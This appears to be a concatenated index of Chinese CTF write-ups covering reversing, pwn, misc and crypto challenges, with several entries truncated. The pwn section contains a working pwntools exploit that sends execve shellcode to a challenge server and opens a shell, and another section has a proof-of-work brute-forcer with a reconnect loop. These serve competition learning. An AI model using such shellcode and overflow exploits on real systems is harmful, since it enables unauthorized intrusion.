经典的MFC逆向，一打开十个按钮，点一下会出base64信息提示是不是正确的flag所在位置。 理论上是要一个个解密，但是我第一次点就是正确的位置，什么是欧皇啊（后仰） 所以看了一眼base64解码结果是f14g here here直接跳过这一步。 定位函数，XSPY开 mfc version:140, static linked?: true, debug?: false CWnd::FromHandlePermanent = 0x0041D79C CWnd = 0x0019FE1C HWND: 0x000E0582 class:0019FE1C(CDialogEx,size=0xd0) CDialogEx:CDialog:CWnd:CCmdTarget:CObject [vtbl+0x00]GetRuntimeClass = 0x0041A3FA(AmazingMFC.exe+ 0x01a3fa ) [vtbl+0x01]dtor = 0x004032C0(AmazingMFC.exe+ 0x0032c0 ) [vtbl+0x02]Serialize = 0x00401FE0(AmazingMFC.exe+ 0x001fe0 ) [vtbl+0x03]OnCmdMsg = 0x004136D2(AmazingMFC.exe+ 0x0136d2 ) [vtbl+0x04]OnFinalRelease = 0x0041E602(AmazingMFC.exe+ 0x01e602 ) [vtbl+0x05]IsInvokeAllowed = 0x00418E4A(AmazingMFC.exe+ 0x018e4a ) [vtbl+0x06]GetDispatchIID = 0x00408452(AmazingMFC.exe+ 0x008452 ) [vtbl+0x07]GetTypeInfoCount = 0x00407440(AmazingMFC.exe+ 0x007440 ) [vtbl+0x08]GetTypeLibCache = 0x00407440(AmazingMFC.exe+ 0x007440 ) [vtbl+0x09]GetTypeLib = 0x00418E42(AmazingMFC.exe+ 0x018e42 ) [vtbl+0x0A]GetMessageMap = 0x00403310(AmazingMFC.exe+ 0x003310 ) [vtbl+0x0B]GetCommandMap = 0x00418E18(AmazingMFC.exe+ 0x018e18 ) [vtbl+0x0C]GetDispatchMap = 0x00418E24(AmazingMFC.exe+ 0x018e24 ) [vtbl+0x0D]GetConnectionMap = 0x00418E1E(AmazingMFC.exe+ 0x018e1e ) [vtbl+0x0E]GetInterfaceMap = 0x0041D9AD(AmazingMFC.exe+ 0x01d9ad ) [vtbl+0x0F]GetEventSinkMap = 0x00418E2A(AmazingMFC.exe+ 0x018e2a ) [vtbl+0x10]OnCreateAggregates = 0x00407F24(AmazingMFC.exe+ 0x007f24 ) [vtbl+0x11]GetInterfaceHook = 0x00408452(AmazingMFC.exe+ 0x008452 ) [vtbl+0x12]GetExtraConnectionPoints= 0x00408452(AmazingMFC.exe+ 0x008452 ) [vtbl+0x13]GetConnectionHook = 0x00408452(AmazingMFC.exe+ 0x008452 ) message map=0x0059DE20(AmazingMFC.exe+ 0x19de20 ) msg map entries at 0x0059DE28(AmazingMFC.exe+ 0x19de28 ) OnMsg:WM_SYSCOMMAND(0112),func= 0x00403430(AmazingMFC.exe+ 0x003430 ) OnMsg:WM_PAINT(000f),func= 0x004034E0(AmazingMFC.exe+ 0x0034e0 ) OnMsg:WM_QUERYDRAGICON(0037),func= 0x00403600(AmazingMFC.exe+ 0x003600 ) OnCommand: notifycode=0000 id=03e8,func= 0x00403620(AmazingMFC.exe+ 0x003620 ) OnCommand: notifycode=0000 id=03ea,func= 0x00403700(AmazingMFC.exe+ 0x003700 ) OnCommand: notifycode=0000 id=03eb,func= 0x004037E0(AmazingMFC.exe+ 0x0037e0 ) OnCommand: notifycode=0000 id=03f0,func= 0x004038C0(AmazingMFC.exe+ 0x0038c0 ) OnCommand: notifycode=0000 id=03f4,func= 0x004039A0(AmazingMFC.exe+ 0x0039a0 ) OnCommand: notifycode=0000 id=03ee,func= 0x00403A80(AmazingMFC.exe+ 0x003a80 ) OnCommand: notifycode=0000 id=03ef,func= 0x00403B60(AmazingMFC.exe+ 0x003b60 ) OnCommand: notifycode=0000 id=03ec,func= 0x00403C40(AmazingMFC.exe+ 0x003c40 ) OnCommand: notifycode=0000 id=03ed,func= 0x00403E80(AmazingMFC.exe+ 0x003e80 ) //flag位置 OnCommand: notifycode=0000 id=03f6,func= 0x00404060(AmazingMFC.exe+ 0x004060 ) 查一下对应按钮的id是03ed，对应的handle函数在0x403E80处 int __thiscall sub_403E80(CWnd *this) { CWnd *DlgItem; // eax int v2; // eax int v3; // ecx const CHAR *v4; // eax const CHAR *v5; // eax int v7; // [esp+Ch] [ebp-118h] int v8; // [esp+10h] [ebp-114h] char v10[208]; // [esp+18h] [ebp-10Ch] BYREF char v11[8]; // [esp+E8h] [ebp-3Ch] BYREF int v12; // [esp+F0h] [ebp-34h] BYREF uint8_t BeingDebugged; // [esp+F7h] [ebp-2Dh] char Source[28]; // [esp+F8h] [ebp-2Ch] BYREF int v15; // [esp+120h] [ebp-4h] DlgItem = CWnd::GetDlgItem(this, -1); CWnd::SetWindowTextA(DlgItem, \"RjE0ZyBoZXJlIGhlcmU=\"); strcpy(Source, \"CFTDSA|6470*\\\"c*a6eaa\u003e2fz\"); sub_401C40(0xD8u); sub_4045A0(0); v15 = 0; CDialog::DoModal((CDialog *)v10); sub_404300(v11); v8 = std::_Ptr_base\u003c_EXCEPTION_RECORD const\u003e::get((char *)this + 208); //这里是check对话框传入的8位数 v7 = sub_403D20(v8); BeingDebugged = 0; BeingDebugged = NtCurrentPeb()-\u003eBeingDebugged; if ( v7 != -239077030 || BeingDebugged ) { v5 = (const CHAR *)std::_Ptr_base\u003c_EXCEPTION_RECORD const\u003e::get((char *)this + 208); CWnd::MessageBoxA(this, v5, \"Oops\", 0); } else { v2 = std::_Ptr_base\u003c_EXCEPTION_RECORD const\u003e::get((char *)this + 208); *((_DWORD *)this + 53) =","date":"2022-10-28","objectID":"/sichuan2022/:1:0","tags":null,"title":"四川省网安技能大赛2022 个人输出复盘","uri":"/sichuan2022/"},{"categories":null,"content":"[Pwn] ezpwn 其实根本没有想过我能在正式比赛里真的写出pwn题，呜呜呜呜呜呜呜呜呜呜呜呜。 附件备份 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments __int64 __fastcall main(int a1, char **a2, char **a3) { _DWORD v4[18]; // [rsp+20h] [rbp-110h] BYREF __int64 v5; // [rsp+68h] [rbp-C8h] char v6[176]; // [rsp+70h] [rbp-C0h] BYREF _DWORD v7[2]; // [rsp+120h] [rbp-10h] BYREF const char *v8; // [rsp+128h] [rbp-8h] strcpy((char *)v4, \"U2FsdGVkX18KkUGt505/bwBwg2VoFZCtD3dq2ZpUGbZ48Xkw3E/6Z7WuwE7yZL2G\"); BYTE1(v4[16]) = 0; HIWORD(v4[16]) = 0; v4[17] = 0; v5 = 0LL; memset(v6, 0, sizeof(v6)); sub_81A(v7, a2, v6); fprintf(stderr, \"%s\\n\", \"Wow!\"); fprintf(stderr, \"%s\\n\", \"Do u know what's is it?\"); sub_885(); v7[1] = 1; v8 = (const char *)sub_8D8(v4); fprintf(stderr, \"%s\\n\", v8); return 0LL; } ssize_t sub_885() { __int64 buf[5]; // [rsp+0h] [rbp-30h] BYREF int v2; // [rsp+2Ch] [rbp-4h] memset(buf, 0, sizeof(buf)); v2 = 1; return read(0, buf, 0x39uLL); } 简单逻辑，输入一个字符串。这里看了一下栈上的空间，其实有栈溢出但是只能覆盖到返回地址的最后一个字节。 有PIE，没有NX，有RWX段，应该是一个ret2shellcode。 其实这里main里的ida F5漏了一个地方： .text:0000000000000B29 call sub_885 .text:0000000000000B2E mov [rbp+var_C], 1 .text:0000000000000B35 cmp [rbp+var_C], 0 .text:0000000000000B39 jz short loc_B50 .text:0000000000000B3B lea rax, [rbp+var_110] .text:0000000000000B42 mov rdi, rax .text:0000000000000B45 call sub_8D8 .text:0000000000000B4A mov [rbp+var_8], rax .text:0000000000000B4E jmp short loc_B52 .text:0000000000000B50 ; --------------------------------------------------------------------------- .text:0000000000000B50 .text:0000000000000B50 loc_B50: ; CODE XREF: main+137↑j .text:0000000000000B50 jmp rbx .text:0000000000000B52 ; --------------------------------------------------------------------------- .text:0000000000000B52 .text:0000000000000B52 loc_B52: ; CODE XREF: main+14C↑j .text:0000000000000B52 mov rax, cs:stderr 这个位置有一个jmp rbx，但是在正常的程序执行里是无法到达的。 正常的返回地址是0x????????B2E，由于PIE保护不会将最后两个字节随机化，所以可以直接利用栈溢出把返回地址的最后一个字节覆盖成0x50达到执行到jmp rbx的目的。 本来以为要先leak栈地址然后想办法控制rbx寄存器使其指向栈上写的shellcode，但是实际实验的时候发现这个题里面rbx已经帮我们设置好了。 直接往栈上写shellcode然后溢出即可。 from pwn import * context.arch = \"amd64\" context.log_level = 'debug' payload = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" extralen = 0x39 - len(payload) payload += b\"P\" * extralen #P == 0x50 print(payload) p = remote(\"tcp.cloud.dasctf.com\", 22873) p.recvuntil(b\"it?\\n\") p.sendline(payload) p.interactive() 紧张刺激地在比赛结束前3min打通了，shellcode换了三四个，鉴定为急了。 ","date":"2022-10-28","objectID":"/sichuan2022/:2:0","tags":null,"title":"四川省网安技能大赛2022 个人输出复盘","uri":"/sichuan2022/"},{"categories":null,"content":"[Misc] 钢琴块 from PIL import Image import os i = 1 while i \u003c= 160: x = 0 for j in range(8): img = Image.open(f\"game/{i+j}.png\").convert(\"L\") if img.getpixel((0, 0)) == 255: x = (x \u003c\u003c 1) | 1 else: x = (x \u003c\u003c 1) print(chr(x), end=\"\") i += 8 i = 1 while i \u003c= 160: x = 0 for j in range(8): img = Image.open(f\"game/{i+j}.png\").convert(\"L\") stt = os.stat(f\"game/{i+j}.png\") q = stt.st_size if img.getpixel((0, 0)) == 255: if q != 336: x = (x \u003c\u003c 1) | 1 else: x = (x \u003c\u003c 1) else: if q == 150: x = (x \u003c\u003c 1) | 1 else: x = (x \u003c\u003c 1) print(chr(x), end=\"\") i += 8 烂活题，没有复盘价值，就这样。 ","date":"2022-10-28","objectID":"/sichuan2022/:3:0","tags":null,"title":"四川省网安技能大赛2022 个人输出复盘","uri":"/sichuan2022/"},{"categories":null,"content":"[Reverse] OhMySolidity 题面如下 input: 0x608060405234801561001057600080fd5b5061066e806100206000396000f3fe608060405234801561001057600080fd5b50600436106100625760003560e01c806314edb54d1461006757806358f5382e1461009157806393eed093146101c55780639577a145146101ef578063a7f81e6a14610253578063f0407ca71461027d575b600080fd5b61006f6102a7565b604051808263ffffffff1663ffffffff16815260200191505060405180910390f35b61014a600480360360208110156100a757600080fd5b81019080803590602001906401000000008111156100c457600080fd5b8201836020820111156100d657600080fd5b803590602001918460018302840111640100000000831117156100f857600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506102bd565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561018a57808201518184015260208101905061016f565b50505050905090810190601f1680156101b75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101cd61056f565b604051808263ffffffff1663ffffffff16815260200191505060405180910390f35b6102516004803603608081101561020557600080fd5b81019080803563ffffffff169060200190929190803563ffffffff169060200190929190803563ffffffff169060200190929190803563ffffffff169060200190929190505050610584565b005b61025b61060d565b604051808263ffffffff1663ffffffff16815260200191505060405180910390f35b610285610623565b604051808263ffffffff1663ffffffff16815260200191505060405180910390f35b600060049054906101000a900463ffffffff1681565b606080829050600060088251816102d057fe5b06146102db57600080fd5b606081516040519080825280601f01601f1916602001820160405280156103115781602001600182028038833980820191505090505b509050600063deadbeef905060008090505b83518110156105635760008090506000809050600080905060008090505b60048160ff1610156103cd578060030360080260ff16888260ff1687018151811061036857fe5b602001015160f81c60f81b60f81c60ff1663ffffffff16901b830192508060030360080260ff168860048360ff16880101815181106103a357fe5b602001015160f81c60f81b60f81c60ff1663ffffffff16901b820191508080600101915050610341565b5060008090505b60208160ff16101561047f578584019350600060049054906101000a900463ffffffff1660058363ffffffff16901c018483016000809054906101000a900463ffffffff1660048563ffffffff16901b011818830192506000600c9054906101000a900463ffffffff1660058463ffffffff16901c01848401600060089054906101000a900463ffffffff1660048663ffffffff16901b0118188201915080806001019150506103d4565b5060008090505b60048160ff1610156105545760ff8160030360080260ff168463ffffffff16901c1660f81b878260ff168701815181106104bc57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535060ff8160030360080260ff168363ffffffff16901c1660f81b8760048360ff168801018151811061051857fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508080600101915050610486565b50505050600881019050610323565b50819350505050919050565b6000809054906101000a900463ffffffff1681565b836000806101000a81548163ffffffff021916908363ffffffff16021790555082600060046101000a81548163ffffffff021916908363ffffffff16021790555081600060086101000a81548163ffffffff021916908363ffffffff160217905550806000600c6101000a81548163ffffffff021916908363ffffffff16021790555050505050565b600060089054906101000a900463ffffffff1681565b6000600c9054906101000a900463ffffffff168156fea265627a7a72315820c500ad9e15f8594ce1140fdf04f71759a549b8a033f78b149472bb00f68975a964736f6c63430005110032 output: None input: 0x9577a1450000000000000000000000000000000000000000000000000000000012345678000000000000000000000000000000000000000000000000000000008765432100000000000000000000000000000000000000000000000000000000aabbccdd0000000000000000000000000000000000000000000000000000000044332211 output: None input(broken): 0x58f5382e... output: 0xa625e97482f83d2b7fc5125763dcbbffd8115b208c4754eee8711bdfac9e3377622bbf0cbb785e612b82c7f5143d5333 根据题目提示和开头60806040可以知道是一个Solidity字节码的逆向。Solidity语言是在区块链的智能合约部署中被广泛使用的语言之一。 由于之前有接触过智能合约字节码逆向我们很快就找到了反编译的工具。 Online Solidity Decompiler (ethervm.io) contract Contract { fun","date":"2022-10-06","objectID":"/sodility/:1:0","tags":null,"title":"智能合约逆向分析实战 ByteCTF2022-OhMySolidity","uri":"/sodility/"},{"categories":null,"content":"[Crypto] nanoDiamond-rev ","date":"2022-08-22","objectID":"/nanogame/:0:0","tags":null,"title":"『超高校级的幸运』WMCTF2022-nanoDiamond-rev 抽卡实况","uri":"/nanogame/"},{"categories":null,"content":"题目 # from Crypto.Util.number import * import string import secrets from hashlib import sha256 from random import randint, shuffle, choice def proof_of_work(): s = ''.join([secrets.choice(string.digits + string.ascii_letters) for _ in range(20)]) print(f'sha256(XXXX+{s[4:]}) == {sha256(s.encode()).hexdigest()}') if input('Give me XXXX: ') != s[:4]: exit(1) ROUND_NUM = 50 PREROUND_NUM = 13 CHEST_NUM = 6 with open('flag', 'r') as f: flag = f.read() white_list = ['==','(',')','0','1','and','or','B0','B1','B2','B3','B4','B5'] def calc(ans, chests, expr): B0, B1, B2, B3, B4, B5 = chests return ans(eval(expr)) def round(): chests = [choice((True, False)) for _ in range(CHEST_NUM)] print(\"Six chests lie here, with mimics or treasure hidden inside.\") print(\"But don't worry. Skeleton Merchant knows what to do.\") print(\"Be careful, Skeleton Merchant can lie twice!\") truth = lambda r: not not r lie = lambda r: not r lie_num = randint(0, 2) lie_status = [truth] * (PREROUND_NUM - lie_num) + [lie] * lie_num shuffle(lie_status) for i in range(PREROUND_NUM): try: question = input('Question: ').strip() for word in question.split(' '): assert word in white_list, f\"({word}) No treasure for dirty hacker!\" result = calc(lie_status[i], chests, question) print(f'Answer: {result}!') except Exception as e: print(\"Skeleton Merchant fails to understand your words.\") print(e) print('Now open the chests:') return chests == list(map(int, input().strip().split(' '))) if __name__ == '__main__': proof_of_work() print('Terraria is a land of adventure! A land of mystery!') print('Can you get all the treasure without losing your head?') for i in range(ROUND_NUM): if not round(): print('A chest suddenly comes alive and BITE YOUR HEAD OFF.') exit(0) else: print('You take all the treasure safe and sound. Head to the next vault!') print(f\"You've found all the treasure! {flag}\") ","date":"2022-08-22","objectID":"/nanogame/:0:1","tags":null,"title":"『超高校级的幸运』WMCTF2022-nanoDiamond-rev 抽卡实况","uri":"/nanogame/"},{"categories":null,"content":"WP 首先我们有异或运算： r1 xor r2 = ((r1 and r2) == 0 ) and (r1 or r2) 考虑先询问每个值一次，询问方法类似： B0 == 1 得到每个bool变量的初始值。 由于可能说谎，验证一下，询问： B0 xor B1 == 1 B2 xor B3 == 1 B4 xor B5 == 1 假设上面的询问与第一轮得到的值有矛盾，则说明A、B、A xor B 中有一个假信息。（有两个假信息概率较小） 此时已经出现一次错误，我们认定后面的回答都是正确的（再次出现假信息概率较小） 考虑再次询问 A xor B： 若答案和之前相同，则认为A xor B正确，询问A可以得到A和B哪个正确，更新A和B的值。 若答案和之前不同则认为A xor B错误，保持A和B值不变。 由于最多可能出现两次矛盾，每次矛盾需要2次询问验证，总询问次数最多为6+3+2+2=13。 但是前面忽略的几种“概率较小”的情况加起来并且在连续进行50轮的情况下出现的概率是非常高的。跑通的概率大概和手游抽卡差不多。 但是不怕，我是欧皇，跑了几百次就出flag了。 from pwn import * context.log_level='info' from Crypto.Util.number import * from pwnlib.util.iters import mbruteforce from hashlib import sha256 from gmpy2 import * table = string.ascii_letters+string.digits def passpow(): io.recvuntil(b\"XXXX+\") suffix = io.recv(16).decode(\"utf8\") io.recvuntil(b\"== \") cipher = io.recvline().strip().decode(\"utf8\") gg = 0 print(suffix) print(cipher) for i1 in range(len(table)): for i2 in range(len(table)): for i3 in range(len(table)): for i4 in range(len(table)): sss = sha256((table[i1]+table[i2]+table[i3]+table[i4]+suffix).encode()).hexdigest() if sss == cipher: gg = 1 io.sendline((table[i1]+table[i2]+table[i3]+table[i4]).encode()) break if gg == 1: break if gg == 1: break if gg == 1: break #io.sendline(proof.encode()) def Xor(a, b): return f\"( ( ( {a}and {b}) == 0 ) and ( {a}or {b}) )\" def Not(x): if x == 1: return 0 else: return 1 def solve(a, b, vala, valb): io.recvuntil(b\"Question: \") io.sendline(f'{Xor(f\"B{a}\", f\"B{b}\")}== 1'.encode()) io.recvuntil(b\"Answer: \") tmp = io.recvline().strip()[:-1] if (eval(tmp)) == ((vala ^ valb) == 1): return vala, valb, 1 io.recvuntil(b\"Question: \") io.sendline(f'{Xor(f\"B{a}\", f\"B{b}\")}== 1'.encode()) io.recvuntil(b\"Answer: \") tmp2 = io.recvline().strip()[:-1] if (eval(tmp2)) == ((vala ^ valb) == 1): return vala, valb, 2 io.recvuntil(b\"Question: \") io.sendline(f'B{a}== 1'.encode()) io.recvuntil(b\"Answer: \") tmp = io.recvline().strip()[:-1] if (eval(tmp)) == vala: return vala, Not(valb), 3 else: return Not(vala), valb, 3 def exp(): passpow() print(\"DONEPOW\") ROUND_NUM = 50 #io.interactive() io.recvuntil(b\"Can you get all the treasure without losing your head?\") for i in range(ROUND_NUM): io.recvuntil(b\"Be careful, Skeleton Merchant can lie twice!\") print(f'round = {i}') ans = [] for j in range(6): io.recvuntil(b\"Question: \") io.sendline(f'B{j}== 1'.encode()) io.recvuntil(b\"Answer: \") tmp = io.recvline().strip()[:-1] if(eval(tmp)): ans.append(1) else: ans.append(0) num = 6 a, b, c = solve(0, 1, ans[0], ans[1]) num += c ans[0] = a ans[1] = b a, b, c = solve(2, 3, ans[2], ans[3]) num += c ans[2] = a ans[3] = b a, b, c = solve(4, 5, ans[4], ans[5]) num += c ans[4] = a ans[5] = b remain = 13 - num for j in range(remain): io.recvuntil(b\"Question: \") io.sendline(f'B{j}== 1'.encode()) io.recvuntil(b\"Answer: \") tmp = io.recvline().strip()[:-1] tosend = str(ans)[1:-1].replace(',','') io.recvuntil(b'Now open the chests:\\n') io.sendline(tosend) io.interactive() while True: try: io = remote(\"1.13.154.182\", 32664) exp() except Exception as e: print(e) ","date":"2022-08-22","objectID":"/nanogame/:0:2","tags":null,"title":"『超高校级的幸运』WMCTF2022-nanoDiamond-rev 抽卡实况","uri":"/nanogame/"},{"categories":null,"content":"[Reverse] Archgame load_code处对bin文件进行了一个解密 for ( i = 0LL; i \u003c size; ++i ) { g_code_data[i] ^= *((_BYTE *)\u0026global_key + (i \u0026 3)); } round()函数有两个switch，手动修复一下，大概逻辑是这个样子。 是一些关于unicorn虚拟机的操作，查一下unicorn引擎的文档可以得到函数作用。 __int64 round() { const char *v0; // rax const char *v1; // rax const char *v2; // rax int errorcode2; // eax unsigned int roundkey; // [rsp+0h] [rbp-30h] BYREF unsigned int errorcode1; // [rsp+4h] [rbp-2Ch] __int64 uc_engine; // [rsp+8h] [rbp-28h] BYREF char v8; // [rsp+10h] [rbp-20h] BYREF __int64 v9; // [rsp+18h] [rbp-18h] BYREF __int64 v10[2]; // [rsp+20h] [rbp-10h] BYREF v10[1] = __readfsqword(0x28u); errorcode1 = uc_open((unsigned int)g_arch, (unsigned int)g_mode, \u0026uc_engine); //创建虚拟机实例 /* Error Handler */ errorcode1 = uc_mem_map(uc_engine, 0LL, 655360LL, 7LL); //创建从地址0开始 长度655360的内存，权限为RWX /* Error Handler */ uc_mem_write(uc_engine, 0LL, g_code_data, 655360LL); //向内存地址0处写入bin文件解密结果 errorcode1 = uc_mem_map(uc_engine, 0x70000000LL, 0x4000LL, 7LL); //创建从地址0x70000000开始 长度0x4000的内存，权限为RWX /* Error Handler */ uc_mem_write(uc_engine, 0x70000000LL, input_area, 0x4000LL); //向地址0x70000000写入输入的数据，长度为0x4000 errorcode2 = uc_mem_map(uc_engine, 0x20000000LL, 0x8000LL, 7LL); //创建从地址0x20000000开始 长度0x8000的内存，权限为RWX v9 = 536903424LL; v10[0] = 1879048448LL; switch ( g_arch ) { case 1: //ARM uc_reg_write(uc_engine, 12LL, \u0026v9); uc_reg_write(uc_engine, 10LL, v10); //写寄存器 break; case 2: // ARM-64 uc_reg_write(uc_engine, 4LL, \u0026v9); uc_reg_write(uc_engine, 2LL, v10); break; case 3: // Mips uc_reg_write(uc_engine, 31LL, \u0026v9); uc_reg_write(uc_engine, 33LL, v10); break; case 5: // PowerPC uc_reg_write(uc_engine, 3LL, \u0026v9); uc_reg_write(uc_engine, 74LL, v10); break; case 8: // RISCV uc_reg_write(uc_engine, 3LL, \u0026v9); uc_reg_write(uc_engine, 2LL, v10); break; } uc_hook_add(uc_engine, (unsigned int)\u0026v8, 1008, (unsigned int)hook_mem, 0, 1, 0LL); //hook了一些非法操作，看起来像是异常处理 hook_mem 是nop函数 errorcode1 = uc_emu_start(uc_engine, 0LL, v9, 0LL, 0LL); //从地址0执行到536903424 switch ( g_arch ) { case 1u: uc_reg_read(uc_engine, 66, (__int64)\u0026roundkey); //读寄存器 break; case 2u: uc_reg_read(uc_engine, 199, (__int64)\u0026roundkey); break; case 3u: uc_reg_read(uc_engine, 4, (__int64)\u0026roundkey); break; case 5u: uc_reg_read(uc_engine, 5, (__int64)\u0026roundkey); break; case 8u: uc_reg_read(uc_engine, 11, (__int64)\u0026roundkey); break; default: break; } uc_close(uc_engine); return roundkey; } 程序的逻辑整体是把challs.bin解密之后加载进来，和输入的fake_flag一起加载到虚拟机中，当flag正确时会返回一个正确的round_key。 global_key 是 round_key 的异或和。每轮使用 round_key 在 map 里寻找对应的 code_info，最后所有 round_key 按顺序拼起来就是 flag。 比较关心的是 g_arch 和 g_mode。查一下unicorn.h的结构体的定义。 typedef enum uc_arch { UC_ARCH_ARM = 1, // ARM architecture (including Thumb, Thumb-2) UC_ARCH_ARM64, // ARM-64, also called AArch64 UC_ARCH_MIPS, // Mips architecture UC_ARCH_X86, // X86 architecture (including x86 \u0026 x86-64) UC_ARCH_PPC, // PowerPC architecture UC_ARCH_SPARC, // Sparc architecture UC_ARCH_M68K, // M68K architecture UC_ARCH_RISCV, // RISCV architecture UC_ARCH_S390X, // S390X architecture UC_ARCH_TRICORE, // TriCore architecture UC_ARCH_MAX, } uc_arch; // Mode type typedef enum uc_mode { UC_MODE_LITTLE_ENDIAN = 0, // little-endian mode (default mode) UC_MODE_BIG_ENDIAN = 1 \u003c\u003c 30, // big-endian mode // arm / arm64 UC_MODE_ARM = 0, // ARM mode UC_MODE_THUMB = 1 \u003c\u003c 4, // THUMB mode (including Thumb-2) // Depreciated, use UC_ARM_CPU_* with uc_ctl instead. UC_MODE_MCLASS = 1 \u003c\u003c 5, // ARM's Cortex-M series. UC_MODE_V8 = 1 \u003c\u003c 6, // ARMv8 A32 encodings for ARM UC_MODE_ARMBE8 = 1 \u003c\u003c 10, // Big-endian data and Little-endian code. // Legacy support for UC1 only. // arm (32bit) cpu types // Depreciated, use UC_ARM_CPU_* with uc_ctl instead. UC_MODE_ARM926 = 1 \u003c\u003c 7, // ARM926 CPU type UC_MODE_ARM946 = 1 \u003c\u003c 8, // ARM946 CPU type UC_MODE_ARM1176 = 1 \u003c\u003c 9, // ARM1176 CPU type // mips UC_MODE_MICRO = 1 \u003c\u003c 4, // MicroMips mode (currently unsupported) UC_MODE_MIPS3 = 1 \u003c\u003c 5, // Mips III ISA (currently unsupported) UC_MODE_MIPS32R6 = 1 \u003c\u003c 6, // Mips32r6 ISA (currently unsupported) U","date":"2022-08-22","objectID":"/archgame/:0:0","tags":null,"title":"WMCTF2022-Archgame","uri":"/archgame/"},{"categories":null,"content":"打开是一个德扑小游戏，根据已知信息找开源代码。 https://github.com/XanderUZZZER/Blackjack-master 比较关心的是原开源代码中没有的对gamemessage文件的处理，可以注意到一个类似作弊码的goldFunc函数。 整理一下删除没用的部分。 private static void goldFunc(ArrayList input, Blackjack.Game game) { if (memcmp(input, \"AQLMP6579\", 9)) { if (memcmp1(input, \"MF3K\", 4)) { try { game.Player.Bet -= 22m; for (int i = 0; i \u003c memory.Length; i++) { memory[i] ^= 34; } Environment.SetEnvironmentVariable(\"AchivePoint1\", game.Player.Balance.ToString()); return; } catch { return; } } } else if (memcmp(input, \"Z5M0G6P16\", 9)) { if (memcmp1(input, \"EEPW\", 4)) { try { game.Player.Balance += 175m; byte[] key = new byte[16] { 66, 114, 97, 105, 110, 115, 116, 111, 114, 109, 105, 110, 103, 33, 33, 33 }; RijndaelManaged rijndaelManaged = new RijndaelManaged(); rijndaelManaged.Key = key; rijndaelManaged.Mode = CipherMode.ECB; rijndaelManaged.Padding = PaddingMode.Zeros; ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(); m = cryptoTransform.TransformFinalBlock(memory, 0, memory.Length); Environment.SetEnvironmentVariable(\"AchivePoint2\", game.Player.Balance.ToString()); return; } catch { return; } } } else { if (!memcmp(input, \"D253Y5J0Y\", 9)) { return; } if (memcmp1(input, \"6VD6\", 4)) { try { game.Player.Balance -= 27m; Environment.SetEnvironmentVariable(\"AchivePoint3\", game.Player.Balance.ToString()); BinaryFormatter binaryFormatter = new BinaryFormatter(); MemoryStream serializationStream = new MemoryStream(m); binaryFormatter.Deserialize(serializationStream); return; } catch { return; } } } } 复制出来直接跑，dump处理后的gamemessage文件。 using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Collections; using System.IO; using System.Runtime.Serialization.Formatters.Binary; using System.Security.Cryptography; namespace ConsoleApp1 { class Program { public static byte[] memory; public static byte[] m; static void Main(string[] args) { FileStream fileStream = File.OpenRead(\"gamemessage\"); int num = (int)fileStream.Length; memory = new byte[num]; fileStream.Position = 0L; fileStream.Read(memory, 0, num); for (int i = 0; i \u003c memory.Length; i++) { memory[i] ^= 34; } byte[] key = new byte[16] { 66, 114, 97, 105, 110, 115, 116, 111, 114, 109, 105, 110, 103, 33, 33, 33 }; RijndaelManaged rijndaelManaged = new RijndaelManaged(); rijndaelManaged.Key = key; rijndaelManaged.Mode = CipherMode.ECB; rijndaelManaged.Padding = PaddingMode.Zeros; ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(); m = cryptoTransform.TransformFinalBlock(memory, 0, memory.Length); BinaryFormatter binaryFormatter = new BinaryFormatter(); MemoryStream serializationStream = new MemoryStream(m); binaryFormatter.Deserialize(serializationStream); fileStream = File.OpenWrite(\"gamemessage2\"); serializationStream.WriteTo(fileStream); } } } 这里反序列化之后的对象读取有些困难，考虑直接读序列化后写入文件的对象。 打开没东西，但是 Strings 可以发现一些令人在意的字符串。 本来以为要读取反序列化后的C#对象，后来根据Strings得到的信息直接在序列化后的对象里 binwalk 出来另一个PE文件。 逆向题这么出你还不如放去misc，一点逻辑没有你出你妈呢，纯纯恶心人浪费时间。 继续逆向得到的 binwalk 文件，令人在意的大概就是以下函数。 public T1() { try { string text = null; string text2 = null; string text3 = null; text = Environment.GetEnvironmentVariable(\"AchivePoint1\"); text2 = Environment.GetEnvironmentVariable(\"AchivePoint2\"); text3 = Environment.GetEnvironmentVariable(\"AchivePoint3\"); if (text == null || text2 == null || text3 == null) { return; } ulong num = ulong.Parse(text); ulong num2 = ulong.Parse(text2); ulong num3 = ulong.Parse(text3); ulong[] array = new ulong[3]; byte[] array2 = new byte[40]; byte[] array3 = new byte[40]; byte[] array4 = new byte[12]; byte[] first = new byte[40] { 101, 5, 80, 213, 163, 26, 59, 38, 19, 6, 173, 189, 198, 166, 140, 183, 42, 247, 223, 24, 106, 20, 145, 37, 24, 7, 22, 191, 110, 179, 227, 5, 62, 9, 13, 17, 65, 22, 37, 5 }; byte[] array5 = new byte[19] { 60, 100, 36, 86, 51, 251, 167, 108, 116, 245, 207, 223, 40, 103, 34, 62, 22, 251, 227 }; array[0] = num; array[1] = num2; array[2] = num3; Check1(array[0], array[1], array[2], array2)","date":"2022-08-04","objectID":"/gamemaster/:0:0","tags":null,"title":"强网杯2022 - GameMaster","uri":"/gamemaster/"},{"categories":null,"content":"Reverse 手不务正业实录 ","date":"2022-08-04","objectID":"/nep/:0:0","tags":null,"title":"NepCTF2022 个人输出复盘","uri":"/nep/"},{"categories":null,"content":"Crypto-p or s 题目脚本 from secret import keys, flag from Crypto.Util.number import * assert(len(keys)==6) Pbox=[ [0, 3, 6, 9, 10, 11, 13, 16, 18, 19, 20, 24, 25, 27, 28, 29, 30, 31], [0, 1, 3, 8, 9, 11, 12, 14, 16, 18, 19, 23, 24, 25, 26, 28, 29], [0, 1, 2, 3, 9, 10, 11, 13, 19, 20, 22, 25, 27, 28, 29, 31], [0, 2, 3, 5, 6, 7, 8, 13, 